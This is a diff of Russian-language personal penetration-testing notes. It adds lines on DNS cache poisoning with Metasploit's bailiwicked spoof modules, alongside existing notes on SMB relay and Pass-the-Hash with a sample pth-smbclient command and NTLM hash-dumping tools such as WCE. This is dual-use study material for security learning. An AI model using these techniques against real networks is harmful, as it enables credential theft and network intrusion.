@@ -61,6 +61,13 @@ Net
         SMB-Relay, если используется NTLMv1, можно юзать моуль метасплоита, для v2 есть питон скрипт с которым нужно поебаться (https://www.securitylab.ru/analytics/442313.php), но я бы погуглил что-нибудь, может и метасплоит уже поддерживает v2
         Еще есть тулза (Responder)
         
+  DNS откравлениие кэша можно реализовать с помощью msf (       msf > use auxiliary/spoof/dns/bailiwicked_
+                                                                use auxiliary/spoof/dns/bailiwicked_domain
+                                                                use auxiliary/spoof/dns/bailiwicked_host
+                                                                msf > use auxiliary/spoof/dns/bailiwicked_domain
+                                                                msf auxiliary(bailiwicked_domain) > show options        )
+  
+     
         Pass-The-Hash: это значит, что можно авторизоваться без открытого пароля, только с помощью хеша, примерная команда (pth-smbclient --user=arm554 --pw-nt-hash -m smb3 -L 172.16.0.10 \\\\172.16.0.10\\ 6361dea164ee8fe91fe7b117fbc9ca5e), это для SMB
           PTH подходить для любых сетевых аутентификаций с помощью NTLM хешей, например можно с помощью Pass-The-Hash tookit, взять хеши залогиненных юзеров, (• whosthere.exe — получаем данные всех залогиненных пользователей; • iam.exe -h administrator:mydomain:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0— подменяем свои данные на данные другого пользователя.)
           + програмка WCE утилита вытаскивает NTLM/LM-хеши из памяти):
